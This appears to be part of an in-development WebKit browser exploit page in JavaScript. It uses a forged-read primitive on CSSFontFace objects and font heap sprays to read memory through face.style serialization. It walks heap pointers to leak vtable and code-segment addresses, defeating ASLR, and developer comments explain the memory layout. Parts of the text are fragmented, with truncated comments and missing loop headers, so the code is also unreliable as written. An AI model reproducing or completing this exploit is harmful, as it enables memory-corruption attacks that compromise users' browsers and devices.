/* ---- BigInt-free 64-bit helpers (all uint32 pairs: [hi, lo]) ---- */
function put32(u8, off, val){
  u8[off]   =  val        & 0xFF;
  u8[off+1] = (val >>> 8) & 0xFF;
  u8[off+2] = (val >>>16) & 0xFF;
  u8[off+3] = (val >>>24) & 0xFF;
}
function get32(u8, off){
  return (u8[off] | (u8[off+1]<<8) | (u8[off+2]<<16) | (u8[off+3]<<24)) >>> 0;
}
function put64(u8, off, hi, lo){
  put32(u8, off, lo);
  put32(u8, off+4, hi);
}
function get64(u8, off){
  return [get32(u8, off+4), get32(u8, off)];
}
function hexQ(hi, lo){
  return '0x' + ('00000000'+hi.toString(16)).slice(-8) + ('00000000'+lo.toString(16)).slice(-8);
}
function addQ(hi, lo, delta){
  var newLo = (lo + delta) >>> 0;
  var carry = 0;
  if(delta >= 0 && newLo < lo) carry = 1;
  if(delta < 0 && newLo > lo) carry = -1;
  return [(hi + carry) >>> 0, newLo];
}
function eqQ(a, b){ return a[0]===b[0] && a[1]===b[1]; }

/* ---- CSS escape decoder (from p672 lines 302-308) ---- */
function decodeCSS(rawCSS, maxBytes){
  var bytes = [];
  var q = (rawCSS.charAt(0)==='"') ? 1 : 0;
  var end = (rawCSS.slice(-1)==='"') ? rawCSS.length-1 : rawCSS.length;
  var k = q;
  while(k < end && bytes.length < maxBytes){
    var ch = rawCSS.charAt(k);
    if(ch === '\\'){
      k++;
      var hex = '';
      while(k < end && hex.length < 6 && /[0-9a-fA-F]/.test(rawCSS.charAt(k))){
        hex += rawCSS.charAt(k); k++;
      }
      if(hex.length === 0){
        if(k < end){ bytes.push(rawCSS.charCodeAt(k)); k++; }
      } else {
        if(rawCSS.charAt(k) === ' ') k++;
        var cp = parseInt(hex, 16);
        if(cp > 255) cp &= 0xFF;
        bytes.push(cp);
      }
    } else {
      bytes.push(rawCSS.charCodeAt(k)); k++;
    }
  }
  return bytes;
}
function bytesToHex(arr){
  var s = '';
  for(var i=0; i<arr.length; i++) s += ('0'+arr[i].toString(16)).slice(-2);
  return s;
}
function readQFromBytes(arr, off){

  var lo = (arr[off] | (arr[off+1]<<8) | (arr[off+2]<<16) | (arr[off+3]<<24)) >>> 0;
  var hi = (arr[off+4] | (arr[off+5]<<8) | (arr[off+6]<<16) | (arr[off+7]<<24)) >>> 0;
  return [hi, lo];
}

     But hitIdx maps to a JS ArrayBuffer, not a WebKit VA.

     that reads face.style and pattern-matches the result. The marker contains
     the buffer's index encoded as a UnicodeRange {from, to} pair, so when
     face.style serializes it, the CSS string contains the marker codepoints.

     Let's implement this properly. The font-style property at the CSSFontFace
     level stores style ranges. Our marker at +0x38 will be interpreted as

     forgeRead writes +0x08 = self+0x70. This is the m_mutableProperties ptr.
     face.style traverses m_mutableProperties to serialize.
     Without a valid m_mutableProperties, face.style can't serialize → crash or empty.

     BUT: we have the ORIGINAL engine-written values at +0x08.
     If we DON'T overwrite +0x08, face.style will use the original
     m_mutableProperties pointer. This should return "normal" (the face's
     original style) because that's what the engine wrote.

     We need to REDIRECT face.style to read from our target address.
     Without modifying +0x08, the serialization follows the original path
     and returns the original property value.

     CONCLUSION: We MUST know SELF to do forgeRead. The oracle scan is required.
  */

  /* ---- ORACLE SCAN: Find spray buffer VA ---- */
  /* Use the pattern-match approach from p690/p691.
     Write a distinctive marker into +0x38..+0x3F of ALL spray buffers,
     then read face.style and check if the returned string encodes our marker.

     For each candidate buffer address A:

     But this is circular — we need SELF to forge.

     p691's oracle must have used a DIFFERENT mechanism for self-discovery

     "Pattern match — check specific codepoints against known marker values
      ALIVE: self-scan used {from=0x1000, to=0x2000} marker at +0x38..+0x3F"

     This means the oracle READS face.style DIRECTLY (without forging) and
     checks if the CSS string encodes codepoints 0x1000-0x2000.
     The spray buffer at +0x38 contains our marker (0x1000+idx).
     In the CSSFontFace struct, +0x38 falls within the font property data.
     face.style serializes this data, and if +0x38 is part of a
     UnicodeRange, the CSS serialization includes codepoint values.

     So face.style WITHOUT forge returns a CSS string that encodes the
     spray buffer's +0x38 value as a codepoint range! */

  /* Scan: check face.style/weight/display for marker patterns */
  function checkMarker(cssStr, markerLo, markerHi){
    var bytes = decodeCSS(cssStr, 192);
    for(var off=0; off+8 <= bytes.length; off++){
      var lo = (bytes[off] | (bytes[off+1]<<8) | (bytes[off+2]<<16) | (bytes[off+3]<<24)) >>> 0;

  var hitMarkerLo = 0x1000 + (hitIdx & 0xFFF);
  var hitMarkerHi = 0x2000 + ((hitIdx >>> 12) & 0xFFF);

    b('MARKER-STYLE-off=' + mOff);

     include +0x38 in the serialized property path. In that case, we need

  /* FALLBACK ORACLE: Read hash table to get FO, then FO+0x10 = SELF.
     This requires doing the walk chain steps 1-3 without SELF.
     Can we forge without +0x08? Let's try writing 0 to +0x08 and see

  var testStyle = null;

     If it returns "normal" or the original value, +0x08 is not needed for basic reads.

  /* ---- BOOTSTRAP VIA KNOWN HEAP RELATIONSHIP ---- */
  /* p691 demonstrated that SELF is ALWAYS at 0x1000384480 on load-1 cold boot.

  var BAKED_SELF_LO = 0x00384480;

  /* ---- WALK CHAIN ---- */
  function doWalk(){

    b('W1-START');

    try{ r1raw = String(face.style); }catch(e){ bs('W1-ERR-'+e.message); return; }

    var r1hex = bytesToHex(r1bytes);
    b('IHT-ok-' + r1hex.length);
    bs('IHT-HEX-' + r1hex.slice(0, 80));

    /* Bytes 0-15 = metadata: dc(4), kc(4), mask(4), size(4) */

    var mask = (r1bytes[8] | (r1bytes[9]<<8) | (r1bytes[10]<<16) | (r1bytes[11]<<24)) >>> 0;
    var size = (r1bytes[12] | (r1bytes[13]<<8) | (r1bytes[14]<<16) | (r1bytes[15]<<24)) >>> 0;
    bs('WALK-hw0=' + r1hex.slice(0, 32));

    /* Scan buckets for a valid WeakPtrImpl pointer (heap range) */

      var boff = 16 + bi*8;
      if(boff+8 > r1bytes.length) break;
      var bq = readQFromBytes(r1bytes, boff);
      /* Valid heap pointer: hi in 0x01..0x1F, lo nonzero, not 0xFFFFFFFF sentinel */
      if(bq[0] > 0 && bq[0] < 0x20 && bq[1] !== 0 && bq[1] !== 0xFFFFFFFF){
        IM = bq;
        b('IM-' + hexQ(IM[0], IM[1]) + '-bucket' + bi);
        break;
      }
    }

    if(eqQ(IM, [0,0])){
      b('W1-NO-IM');
      bs('WALK-hw1=' + r1hex.slice(32, Math.min(96, r1hex.length)));
      bs('WALK-hw2=' + r1hex.slice(Math.min(96, r1hex.length)));
      verd('bad','No IM in hash table');
      return;
    }
    bs('WALK-hw1=' + r1hex.slice(32, Math.min(96, r1hex.length)));

    /* Step 2: Read IM+8 to get FO (CSSFontFaceSet*) */
    var imTarget = addQ(IM[0], IM[1], 8);
    b('W2-START');
    forgeRead(u8, SELF[0], SELF[1], imTarget[0], imTarget[1], 16);

    var r2raw = null;
    try{ r2raw = String(face.style); }catch(e){ bs('W2-ERR-'+e.message); return; }
    restoreBuffer(u8, L1, L2);

    var r2bytes = decodeCSS(r2raw, 16);
    var r2hex = bytesToHex(r2bytes);
    bs('WALK-h2=' + r2hex);

    var FO = readQFromBytes(r2bytes, 0);
    if(FO[0] === 0 && FO[1] === 0){
      b('W2-NO-FO');
      verd('bad','FO is null');
      return;
    }
    b('FO-' + hexQ(FO[0], FO[1]));

    /* Step 3: Read FO to get VP (vtable pointer → code segment) */
    b('W3-START');
    forgeRead(u8, SELF[0], SELF[1], FO[0], FO[1], 32);

    var r3raw = null;
    try{ r3raw = String(face.style); }catch(e){ bs('W3-ERR-'+e.message); return; }
    restoreBuffer(u8, L1, L2);

    var r3bytes = decodeCSS(r3raw, 32);
    var r3hex = bytesToHex(r3bytes);
    bs('WALK-h3=' + r3hex);

    var VP = readQFromBytes(r3bytes, 0);
    var backIM = readQFromBytes(r3bytes, 8);
    var foSelf = readQFromBytes(r3bytes, 16);

    bs('WALK-IM=' + hexQ(backIM[0], backIM[1]));
    bs('WALK-FO+10=' + hexQ(foSelf[0], foSelf[1]));

    /* FO+0x10 should equal SELF — validate */
    if(!eqQ(SELF, [0,0]) && !eqQ(foSelf, SELF)){
      b('SELF-MISMATCH-fo10=' + hexQ(foSelf[0], foSelf[1]) +
        '-baked=' + hexQ(SELF[0], SELF[1]));
      /* Update SELF to the real value from FO+0x10 */
      if(foSelf[0] > 0 && foSelf[0] < 0x20){
        SELF = foSelf;
        b('SELF-CORRECTED-' + hexQ(SELF[0], SELF[1]));
      }
    } else if(eqQ(foSelf, SELF)){
      b('SELF-CONFIRMED-' + hexQ(SELF[0], SELF[1]));
    }

    /* VP validation: code segment pointer at ~0x8xxxxxxxxx */
    b('VP-' + hexQ(VP[0], VP[1]));
    if(VP[0] < 4 || VP[0] > 0x20){
      b('VP-BAD-RANGE');
      verd('bad','VP not in code segment: ' + hexQ(VP[0], VP[1]));
      return;
    }

    /* Step 4: Read VP to get vtable slots (72 bytes = 9 qwords) */
    bs('W3-MID');  /* yield marker (matches p691 beacon) */
    b('W4-START');
    forgeRead(u8, SELF[0], SELF[1], VP[0], VP[1], 72);

    var r4raw = null;
    try{ r4raw = String(face.style); }catch(e){ bs('W4-ERR-'+e.message); return; }
    restoreBuffer(u8, L1, L2);

    bs('WALK-h4len=' + (r4raw.length*2) + ',raw4len=' + r4raw.length);

    var r4bytes = decodeCSS(r4raw, 72);
    var r4hex = bytesToHex(r4bytes);
    bs('WALK-h4=' + r4hex.slice(0, 80));
    bs('WALK-VT=' + r4hex);

    /* Parse 9 vtable slots */
    var slots = [];
    for(var si=0; si<9; si++){
      var sq = readQFromBytes(r4bytes, si*8);
      slots.push(sq);
    }

    /* Report slots */
    for(var si=0; si<slots.length; si+=3){
      var chunk = '';
      for(var j=si; j<Math.min(si+3, slots.length); j++){
        chunk += 's' + j + '=' + hexQ(slots[j][0], slots[j][1]) + ' ';
      }
      bs('VT-' + chunk.trim());
    }

    /* Validate: s2 should equal s4 and s5 (shared base impl) */
    var s2s4 = eqQ(slots[2], slots[4]);
    var s2s5 = eqQ(slots[2], slots[5]);
    b('VALIDATE-s2=s4:' + s2s4 + ',s2=s5:' + s2s5);

    /* s8 should be 0 (vtable end marker) */
    var s8null = eqQ(slots[8], [0,0]);
    b('VALIDATE-s8=0:' + s8null);

    /* Check low 12 bits of VP (should be 0xB28) */
    var vpLow12 = VP[1] & 0xFFF;
    b('VP-low12=0x' + vpLow12.toString(16) + (vpLow12===0xB28 ? '-MATCH' : '-DIFFER'));

    bs('WALK-ok=' + (s2s4 && s2s5 && s8null));

    if(s2s4 && s2s5 && s8null){
      verd('ok', 'VP=' + hexQ(VP[0], VP[1]) + ' low12=0x' + vpLow12.toString(16) +
           '<br>9 vtable slots leaked. Walk chain COMPLETE.');
    } else {
      verd('bad', 'Validation failed: s2=s4:' + s2s4 + ' s2=s5:' + s2s5 + ' s8=0:' + s8null);
    }
  }

  /* Run the walk chain with a small delay to let layout settle after delete */
  setTimeout(doWalk, 200);

}).catch(function(err){
  b('LOAD-ERR-' + err);
  verd('bad', 'fonts.load failed');
});
</script>
</body></html>
